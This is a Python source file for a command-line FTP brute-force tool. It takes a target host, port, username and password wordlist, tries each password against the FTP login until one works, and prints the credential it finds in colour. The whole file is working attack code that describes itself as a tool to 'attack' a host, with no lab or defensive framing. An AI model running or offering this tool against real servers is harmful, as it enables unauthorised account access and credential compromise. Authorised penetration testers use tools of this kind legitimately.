import ftplib
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit


def get_args():
    """ Function to get command-line arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g., 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=21,
                        type=int, required=False, help="Port to attack on, Default:21")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                        required=True, type=str)
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username to brute force")
    arguments = parser.parse_args()

    return arguments


def ftp_bruteforce(hostname, username, password, port):
    """Attempts to connect to the FTP server with the given credentials."""
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(hostname, port, timeout=5)
            ftp.login(user=username, passwd=password)
            print(colored(f"[{port}] [ftp] host:{hostname}  login:{username}  password:{password}", 'green'))
            return True
    except ftplib.error_perm:
        print(f"[Attempt] target {hostname} - login:{username} - password:{password} [FAILED]")
        return False
    except Exception as e:
        print(f"[ERROR] target {hostname} - {e}")
        return False


def main(hostname, port, username, wordlist):
    """The main function handles the brute force process."""
    passwords = []
    found = False

    if not path.exists(wordlist):
        print(colored("[-] Wordlist location is not right.\n[-] Provide the correct path to the wordlist", 'red'))
        exit(1)

    with open(wordlist, 'r') as f:
        for password in f.readlines():
            passwords.append(password.strip())

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red"), end="")
    print(hostname)
    print(colored(f"[*] Username\t: ", "light_red"), end="")
    print(username)
    print(colored(f"[*] Port\t: ", "light_red"), end="")
    print('21' if not port else port)
    print(colored(f"[*] Wordlist\t: ", "light_red"), end="")
    print(wordlist)
    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("FTP")
    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(f"FTP Brute Force starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    for password in passwords:
        if found:
            break
        if ftp_bruteforce(hostname, username, password, port):
            found = True

    if not found:
        print(colored("\n[-] Failed to find the correct password.", "red"))


if __name__ == "__main__":
    arguments = get_args()
    main(arguments.target, arguments.port, arguments.username, arguments.wordlist)
